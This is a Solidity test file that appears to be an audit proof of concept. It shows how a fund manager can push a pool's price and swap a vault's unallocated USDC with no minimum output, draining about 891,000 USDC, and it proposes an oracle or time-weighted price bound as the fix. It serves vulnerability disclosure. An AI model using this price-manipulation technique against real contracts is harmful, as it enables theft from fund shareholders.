// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {IFundFactory} from "../../../src/interfaces/IFundFactory.sol";
import {CoreVault} from "../../../src/core/CoreVault.sol";
import {SpokeVault} from "../../../src/spoke/SpokeVault.sol";
import {AccessFundFixture} from "./AccessFundFixture.sol";

/// @title PoC: a manager swap accepts any execution price, so the manager trades the fund against itself
/// @notice ATTACK. `SpokeVault.swapExactInput` (SpokeVault.sol:333) takes `minAmountOut` and the price limit from the
///         manager and checks the output against nothing else: no oracle, no spot bound, no size or rate limit. The
///         Mandate's closed pool list (DEC-030) fixes WHERE the manager trades, not at what price. A manager that is
///         a contract (nothing requires an EOA) does, in one transaction: push the Mandate pool's price with its own
///         capital or a flash loan, call `swapExactInput(all Unallocated USDC, minAmountOut = 0)`, then trade back.
///         The fund buys at the pushed price; the manager's closing trade collects the difference. The same holds
///         for `swapCollectedIncome` (income) and for `openPosition` at a pushed price (the fund's liquidity is the
///         counterparty of the manager's closing trade). The automatic unwind has a floor (spot less 5%, QA3); the
///         manager's own swaps have none.
/// @notice IMPACT. The manager can move nearly all of a Spoke Vault's Unallocated Balance to itself in one
///         transaction, on the hub and on every spoke, limited only by how far the pool can be pushed (cheap in a
///         thin pool, and the manager chose the pools). Shareholders cannot react: a Payout Request is priced after
///         the fact.
/// @notice BUSINESS RULE. DEC-027 and DEC-030 decide there is no loss budget and no per-operation loss limit, and
///         OQ-04 leaves the swap verb's Market Costs open, so this is the rule as decided. It is reported because the
///         rule was written for market losses, and a swap with `minAmountOut = 0` against a price the caller sets is
///         a transfer, not a market loss.
/// @notice FIX (needs a ruling). Anchor manager swaps to a price the manager does not control: on the hub the fund
///         already has `IPriceSource`; require `amountOut >= oracle value less a Mandate bound in bps` for tokens it
///         prices. On a spoke without a price source, bound the pool's spot against a time-weighted price, or accept
///         the risk explicitly per Mandate pool.
/// @dev The mock Uniswap V4 swaps at a rate the test sets (`setSwap`); that knob stands in for the manager's own
///      trade that moves the pool before the fund's swap and back after it.
contract ManagerSwapNoPriceGuardPoC is AccessFundFixture {
    function test_POC_managerSwapsUnallocatedBalanceAtAPriceItSet() public {
        (IFundFactory.FundAddresses memory a,) = _createFund(_plan());
        CoreVault core = CoreVault(a.coreVault);
        SpokeVault hub = _hubVault(a);
        address adapter = a.chains[0].uniswapV4Adapter;
        _deposit(core, alice, 600_000e6);
        _deposit(core, bob, 400_000e6);
        vm.prank(manager);
        core.allocateToHubSpokeVault(900_000e6);
        assertEq(core.shareAssets(), 997_500e6);

        // The manager pushes the pool: 1 unit of WETH now costs 100 units of USDC (the oracle still says 1).
        v4.setSwap(0.01e18, 10_000);
        vm.prank(manager);
        uint256 wethOut = hub.swapExactInput(adapter, _hubPoolId(), address(usdc), 900_000e6, 0, "");
        // The manager trades back; the pool is where the oracle has it again.
        v4.setSwap(1e18, 10_000);

        assertEq(wethOut, 9000e6, "900,000 USDC of Unallocated Balance bought 9,000 USDC worth of WETH");
        assertEq(hub.unallocatedBalance(address(usdc)), 0);
        assertEq(core.shareAssets(), 97_500e6 + 9000e6, "891,000 USDC left the fund in one manager call");
        assertLt(core.sharePrice(), 0.11e24, "Share Price: from 1.00 to under 0.11");
    }
}
